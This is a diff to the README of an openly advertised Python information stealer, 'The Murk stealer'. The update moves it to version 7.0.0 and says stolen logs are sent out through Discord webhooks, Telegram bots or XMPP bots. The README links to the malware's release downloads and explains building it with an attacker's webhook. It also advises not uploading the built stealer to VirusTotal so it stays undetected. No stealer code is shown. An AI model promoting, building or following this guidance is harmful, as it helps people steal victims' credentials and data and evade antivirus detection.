@@ -8,8 +8,8 @@
 <img src="https://img.shields.io/badge/platform-windows-989898?style=for-the-badge&logo=&logoColor=whit">
 
 
-Stealer written on Python, results will be sent to Telegram bot.
-[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v6.0.4)
+🔐open source turbo🚀 stealer written on Python, all logs will be sent using discord webhooks, telegram bot or XMPP bot.
+[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v7.0.0)
 
 ⭐Please, star this repo if it was helpful⭐
 
@@ -102,7 +102,7 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
 ### 🔨Builder
 
 ### 🎮For Discord
-__So firstly you need to download [python](https://www.python.org/downloads/). Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v6.0.4). 
+__So firstly you need to download [python](https://www.python.org/downloads/). Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v7.0.0). 
 After that, you need to create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks#conclusion).
 Finally, insert the name and webhook link in the builder. And wait, secure building will take about 2 minutes.__
 
